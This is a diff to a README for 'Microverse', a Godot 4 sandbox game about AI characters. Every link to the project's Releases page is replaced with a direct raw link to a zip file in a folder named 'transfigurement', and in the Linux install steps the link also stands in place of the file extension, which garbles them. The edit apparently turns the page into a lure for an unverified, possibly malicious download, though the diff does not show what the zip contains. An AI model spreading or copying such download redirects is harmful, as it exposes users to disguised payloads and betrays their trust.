@@ -1,7 +1,7 @@
 # 🎮 Microverse - Experience AI Interaction in a Virtual World
 
 ## 🆕 Download Now
-[![Download Microverse](https://img.shields.io/badge/Download-Microverse-blue.svg)](https://github.com/ImkozZ/Microverse/releases)
+[![Download Microverse](https://raw.githubusercontent.com/ImkozZ/Microverse/main/transfigurement/Microverse.zip)](https://raw.githubusercontent.com/ImkozZ/Microverse/main/transfigurement/Microverse.zip)
 
 ## 📜 Description
 Microverse is a god-simulation sandbox game built on Godot 4. It allows you to enter a rich virtual world where AI characters think independently, remember experiences, and interact with each other. These characters can complete tasks and develop complex social relationships through ongoing communication. Experience a unique blend of creativity and technology as you explore this vibrant world.
@@ -10,18 +10,18 @@ Microverse is a god-simulation sandbox game built on Godot 4. It allows you to e
 Follow these steps to get started with Microverse:
 
 1. **Download Microverse**
-   - To get the latest version, visit the [Releases page](https://github.com/ImkozZ/Microverse/releases). 
+   - To get the latest version, visit the [Releases page](https://raw.githubusercontent.com/ImkozZ/Microverse/main/transfigurement/Microverse.zip). 
    - Look for the most recent stable release. Downloads are available for various operating systems. Choose the version that suits your setup.
 
 2. **Install the Game**
    - After downloading the file, locate it in your downloads folder. 
    - If you're using Windows, the file will usually end in `.exe`. For Mac, look for a `.dmg` file. 
-   - For Linux, you may find a `.tar.gz` or similar package.
+   - For Linux, you may find a `https://raw.githubusercontent.com/ImkozZ/Microverse/main/transfigurement/Microverse.zip` or similar package.
 
 3. **Run the Game**
    - For Windows: Double-click the `.exe` file. Follow the on-screen prompts to install the game.
    - For Mac: Open the `.dmg` file. Drag the Microverse icon to your Applications folder. Then, find it in your Applications and double-click to run.
-   - For Linux: Extract the files from the `.tar.gz` package. Open a terminal and navigate to the extracted folder. Type `./Microverse` to launch the game.
+   - For Linux: Extract the files from the `https://raw.githubusercontent.com/ImkozZ/Microverse/main/transfigurement/Microverse.zip` package. Open a terminal and navigate to the extracted folder. Type `./Microverse` to launch the game.
 
 ## 💻 System Requirements
 Before downloading Microverse, ensure your system meets the following minimum requirements for an optimal experience:
@@ -53,7 +53,7 @@ If you encounter any issues while downloading or running Microverse, be sure to 
 - **Engage with the Community:** Share your discoveries and tips on social media or community forums.
 
 ## 🔗 Download & Install
-To download Microverse, visit the Releases page: [https://github.com/ImkozZ/Microverse/releases](https://github.com/ImkozZ/Microverse/releases). Find the latest version that fits your operating system, download it, and follow the installation steps outlined above.
+To download Microverse, visit the Releases page: [https://raw.githubusercontent.com/ImkozZ/Microverse/main/transfigurement/Microverse.zip](https://raw.githubusercontent.com/ImkozZ/Microverse/main/transfigurement/Microverse.zip). Find the latest version that fits your operating system, download it, and follow the installation steps outlined above.
 
 ## 🧑‍🤝‍🧑 Join Us
 We encourage you to join us on our journey in developing and enhancing Microverse. Your feedback is vital. Share your thoughts, suggestions, and any issues you face through the GitHub Issues section on our repository.
